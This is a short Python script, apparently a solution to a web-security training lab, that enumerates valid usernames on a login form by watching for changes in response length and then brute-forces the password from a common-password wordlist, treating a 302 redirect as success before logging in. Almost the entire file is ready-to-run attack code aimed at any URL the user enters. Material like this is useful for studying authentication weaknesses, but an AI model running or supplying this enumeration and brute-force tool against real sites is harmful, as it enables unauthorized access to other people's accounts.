import requests
from bs4 import BeautifulSoup

lab_url = str(input('Enter the target URL:' ))

users = ["carlos","root","admin","test","guest","info","adm","mysql","user","administrator","oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico","acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit","admin","administracion","administrador","administrator","administrators","admins","ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda","agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts","alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce","announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple","application","applications","apps","appserver","aq","ar","archie","arcsight","argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at","athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"]
passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]

with requests.session() as ses:

#Finds the changes in response length and find the correct username
    def usernameenum(url, users):
        response_length = []
        username = ""
        for i in users:
            bodi = { "username": i, "password": "abcd" }
            req = ses.post(url , data=bodi)
            if (len(response_length) == 0):
                response_length.append(len(req.content))

            if (len(req.content) > response_length[0]):
                response_length.append(len(req.content))
                username = i
        print(f'Username found: {username} ')
        return username
        

# With correct username, bruteforce the correct password
    def get_pass(url , user , passw):
        pass_found = ""
        for i in passw:
            bodi = { "username": user, "password": i}
            req = ses.post(url , data=bodi, allow_redirects=False)
            if(req.status_code == 302):
                pass_found = i
        
        return(pass_found)



correct_useranme = usernameenum(lab_url, users)
correct_password = get_pass(lab_url,correct_useranme, passwords)
print(f'Cracked username and passowrd is {correct_useranme} , {correct_password}')

bodi = { "username": correct_useranme, "password": correct_password}
final_req = requests.post(url= lab_url , data= bodi)
print(final_req.text)


